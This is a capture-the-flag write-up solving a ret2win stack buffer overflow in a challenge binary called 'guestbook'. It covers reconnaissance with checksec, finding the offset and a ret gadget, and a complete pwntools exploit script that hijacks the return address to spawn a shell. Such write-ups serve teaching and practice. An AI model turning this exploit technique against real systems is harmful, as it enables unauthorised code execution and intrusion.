## Guestbook - ret2win

The challenge presents a classic ret2win scenario, where the goal is to redirect execution to a `win()` function that is never called in the normal program flow but is compiled into the binary and grants a shell via `system("/bin/sh")`.

### The Vulnerable Code

Reading through `main.c`, the vulnerability is immediately obvious in `vuln()`, which declares a stack buffer of only 64 bytes but then reads up to 256 bytes into it via `read(STDIN_FILENO, buf, 256)`, creating a straightforward stack buffer overflow with no bounds checking whatsoever. The `win()` function is decorated with `__attribute__((noreturn))` and never invoked by `main()`, which means the only way to reach it is by corrupting the saved return address on the stack. The `setup()` function disables buffering on all three standard streams, which is a deliberate quality-of-life choice by the challenge author to make pwntools interaction reliable.

The attack chain follows directly from the overflow: oversized input fills `buf[64]`, continues past the saved `RBP`, overwrites the saved `RIP`, and redirects execution to `win()`.

### Phase 1 - Reconnaissance

Running `checksec` against the binary reveals a very favorable protection landscape. NX is enabled, which rules out shellcode injection entirely since the stack is marked non-executable, but this is not a concern here because the target is a function already present in the binary. PIE is disabled, meaning the binary is loaded at the fixed base address `0x400000` on every single run, so `win()` will always sit at the same address without any need for a leak. Most importantly, no stack canary is present, which means the overflow reaches the saved return address without any guard value standing in the way. SHSTK and IBT are listed as enabled, though for a straightforward ret2win they do not meaningfully complicate the exploit.

### Phase 2 - Finding `win()` and the Offset to RIP

Since PIE is disabled, `nm` gives a definitive, stable address for `win()`:

sh

```sh
nm ./guestbook | grep win
# 000000000040121b t win
```

To find the exact offset from the start of `buf` to the saved `RIP`, a cyclic pattern of 200 bytes is generated with pwntools and fed to the binary under GDB. After the crash, `cyclic -l` on the value found in the backtrace (preferred over `$rip` directly, which can be unreliable) confirms the offset is exactly 72 bytes. This means 64 bytes of buffer plus 8 bytes of saved `RBP` are consumed before the saved return address is reached, which is consistent with the standard x86-64 stack frame layout.

### Phase 3 - The `ret` Gadget

A bare `ret` gadget is needed before `win()` to ensure 16-byte stack alignment, a requirement of the System V AMD64 ABI that `system()` enforces internally. Without it, `movaps` instructions inside `system()` will fault on a misaligned stack. ROPgadget locates one cleanly:

```sh
ROPgadget --binary ./guestbook | grep ": ret$"
# 0x000000000040101a : ret
```

### Phase 4 - The Exploit

With all three ingredients in hand, the exploit is straightforward: 72 bytes of padding, the `ret` gadget to fix alignment, and then the address of `win()`.

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./guestbook")
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_RIP = 72

# ── gadgets ───────────────────────────────────────────────────────────────────
GADGET = 0x000000000040101a   # ret — stack alignment

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── exploit phase ─────────────────────────────────────────────────────────
    payload = flat(
        b'A' * OFFSET_TO_RIP,   # fill buffer + saved RBP
        p64(GADGET),             # ret — align stack to 16 bytes
        p64(exe.sym.win),        # redirect execution to win()
    )

    r.recvuntil(b"name?\n")
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()
```

Note that `exe.sym.win` is used rather than the hardcoded address, which is the cleaner approach since pwntools resolves the symbol automatically from the ELF, and it remains consistent even if the binary is recompiled with a slightly different layout. The `r.send()` call is intentional rather than `r.sendline()`, since appending a newline is unnecessary here and could in some configurations introduce a stray byte into the payload.
